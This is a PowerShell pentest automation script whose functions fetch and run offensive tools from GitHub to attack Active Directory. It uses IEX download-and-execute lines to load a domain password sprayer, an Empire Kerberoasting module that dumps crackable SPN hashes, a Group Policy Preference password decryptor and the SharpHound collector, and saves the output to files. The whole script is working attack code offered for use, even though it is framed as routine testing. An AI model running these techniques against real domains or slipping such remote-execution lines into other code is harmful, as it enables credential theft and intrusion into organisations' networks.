<#
.SYNOPSIS
	Invokes one or more common pentest techniques
.DESCRIPTION
	Invokes one or more common pentest techniques. These are tests that cover most route pentests with no need for evasion.
.EXAMPLE Run All Tests
	PS/> Invoke-Pentests
.EXAMPLE Run One Test
	PS/> Invoke-Pentests -TestID T1110
.EXAMPLE Cleanup Files that were Created
	PS/> Invoke-Pentests -Cleanup
.NOTES
	None
.LINK
	None
#>

		
function Invoke-T1110
{

	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true)]
		[String]
		$Password,
		
		[Parameter(Mandatory = $false)]
		[String]
		$OutFilePath = "$env:USERPROFILE\pw-spray-$Password.txt"
	)

	Write-Output 'Testing: T1110 (Password Spraying)'
	
	IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
	Invoke-DomainPasswordSpray -Password $Password -Force -OutFile $OutFilePath
}


function Invoke-T1208
{

	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $false)]
		[String]
		$OutputFormat = 'hashcat',
		
		[Parameter(Mandatory = $false)]
		[String]
		$OutFilePath = "$env:USERPROFILE\spn-hashes.txt"
	)

	Write-Output 'Testing: T1208 (Kerberoast)'
	
	IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BC-Security/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
	Invoke-Kerberoast -OutputFormat $OutputFormat | Out-File -Encoding UTF8 -FilePath $OutFilePath
}


function Invoke-T1081
{
	
	[CmdletBinding()]
	Param(	
		[Parameter(Mandatory = $false)]
		[String]
		$OutFilePath = "$env:USERPROFILE\GPPPasswords.txt"
	)

	Write-Output 'Testing: T1081 (Group Policy Preference Passwords)'
	
	IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/swarleysez/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1')
	$GPPPasswords = Get-GPPPassword | Where-Object {$_.passwords -notlike '*BLANK*'} | Sort-Object -Property Passwords -Unique
	if ($GPPPasswords -ne $null)
	{
		$GPPPasswords | Out-File -Encoding UTF8 -FilePath $OutFilePath
	}
}


function Invoke-T1086
{
	
	[CmdletBinding()]
	Param(	
		[Parameter(Mandatory = $false)]
		[String]
		$OutDir = $env:USERPROFILE
	)

	Write-Output 'Testing: T1086 (BloodHound Collection)'
	
	IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1')
	Invoke-BloodHound -CollectionMethod All,Loggedon -NoSaveCache -OutputDirectory $OutDir
}


function Invoke-Cleanup
{

	[CmdletBinding()]
	Param(	
		[Parameter(Mandatory = $false)]
		[String[]]
		$Files = @("pw-spray-*.txt","spn-hashes.txt","1","*BloodHound.zip","GPPPasswords.txt"),
		
		[Parameter(Mandatory = $false)]
		[String]
		$BasePath = "$env:USERPROFILE"
		
	)

	foreach ($file in $Files)
		{
			if (Test-Path $BasePath\$file)
				{
					Write-Output "Removing: $BasePath\$file"
					Remove-Item $BasePath\$file
				}
		}
}


function Invoke-Pentest
{	
	
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $false,
			Position = 0)]
		[String]
		$TestID,
		
		[Parameter(Mandatory = $false)]
		[String]
		$Password = 'Welcome2020!',
		
		[Parameter(Mandatory = $false)]
		[Switch]
		$List,
		
		[Parameter(Mandatory = $false)]
		[Switch]
		$Cleanup
	)
	
	
	if ($List)
	{
		# Hashtable containing tests
		$TestTable = @{
			'All'			= 'Run All Tests'
			'Collection'	= 'Run Collection Tests'
			'T1086'			= 'Executes BloodHound using the collection methods of "All" and "Loggedon"'
			'T1081'			= 'Searches through domain SYSVOL share for any Group Policy Preferences Passwords and decrypts them'
			'T1208'			= 'Executes kerbeoasting technique against all available SPNs'
			'T1110'			= 'Executes password spraying against all active domain accounts. Default password is "Welcome2020!"'
		}
		
		$TestTable.GetEnumerator() | Sort-Object -Property Key | Format-Table @{Label='TestID';Expression={$_.Key}},@{Label='Description';Expression={$_.Value}}
	}
	elseif ($Cleanup)
	{
		Invoke-Cleanup
	}
	elseif ($TestID -eq 'Collection')
	{
		Invoke-T1081
		Invoke-T1208
		Invoke-T1086
	}
	elseif ($TestID -eq 'All')
	{
		$title = "Confirm Running All Tests"
        $message = "Are you sure you want to run ALL tests, including password spraying?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Runs all test, including password spraying."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the execution."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 1)

        if ($result -ne 0)
        {
            Write-Host "Cancelling execution of all tests."
            break
        }
		elseif ($result -eq 0)
		{
			Invoke-T1110 -Password $Password
			Invoke-T1081
			Invoke-T1208
			Invoke-T1086
		}
	}
	else
	{
		Write-Error 'Provide a valid test (Ex. T1081). Use "Invoke-Pentest -List" to see all tests.'
	}
}